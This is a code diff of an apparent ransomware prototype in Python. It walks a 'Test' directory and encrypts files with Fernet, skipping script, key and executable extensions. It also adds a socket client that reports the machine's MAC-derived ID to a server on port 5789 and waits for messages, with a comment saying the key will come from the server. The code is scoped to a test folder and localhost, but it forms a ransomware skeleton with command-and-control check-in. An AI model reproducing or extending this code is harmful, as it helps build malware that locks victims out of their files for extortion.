@@ -1,6 +1,12 @@
 import os
 from pathlib import Path
 from cryptography.fernet import Fernet
+import socket
+import select
+import sys
+from threading import Thread
+import uuid
+
 
 def recursiveScan(baseDir):
     # scan current directory
@@ -46,27 +52,54 @@ def decrypt(file, key):
     with open(decFile, 'wb+') as fl:
         fl.write(decrypted)
 
+def encryptFiles(key):
+    exclude = ['.py','.pem', '.exe', '.imin']
+    for item in recursiveScan(os.getcwd() + '\Test'): 
+        filePath = Path(item)
+        extension = filePath.suffix.lower()
+
+        if extension in exclude:
+            continue
+        encrypt(filePath, key)
+        print('Encrypted ' + str(filePath))
+
+def decryptFiles(key):
+    exclude = ['.py','.pem', '.exe', '.imin']
+    for item in recursiveScan(os.getcwd() + '\Test'): 
+        filePath = Path(item)
+        extension = filePath.suffix.lower()
+
+        if extension in exclude:
+            continue
+        decrypt(filePath, key)
+
+# way to ID
+MESSAGE = uuid.getnode()
 
 # key is given by server
 ### Temporary
 key = Fernet.generate_key()
 ### ----------
+HOST = 'localhost'
+PORT = 5789
 
-exclude = ['.py','.pem', '.exe', '.imin']
-for item in recursiveScan(os.getcwd() + '\Test'): 
-    filePath = Path(item)
-    extension = filePath.suffix.lower()
+BUFFER_SIZE = 1024
 
-    if extension in exclude:
-        continue
-    encrypt(filePath, key)
-    print('Encrypted ' + str(filePath))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+print('Connected!')
+s.send(MESSAGE)
+socket_list = [sys.stdin, s]
 
-for item in recursiveScan(os.getcwd() + '\Test'): 
-    filePath = Path(item)
-    extension = filePath.suffix.lower()
+while 1:
+    read_sockets, write_sockets, error_sockets = select.select(socket_list, [], [])
 
-
-    if extension in exclude:
-        continue
-    decrypt(filePath, key)
+    for sock in read_sockets:
+        if sock == s:
+            data = sock.recv(4096)
+            if not data:
+                print('\nDisconnected from server')
+                sys.exit()
+            else:
+                message = data.decode()
+                print(message)
